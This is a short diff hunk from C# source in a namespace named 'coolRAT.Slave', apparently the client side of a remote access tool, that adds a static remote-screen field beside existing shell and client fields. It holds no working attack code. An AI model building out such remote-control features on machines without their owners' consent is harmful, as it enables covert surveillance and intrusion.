@@ -11,5 +11,6 @@ namespace coolRAT.Slave
     {
         public static Client LocalClient;
         public static Shell ShellInstance;
+        public static RemoteScreen ScreenInstance;
     }
 }
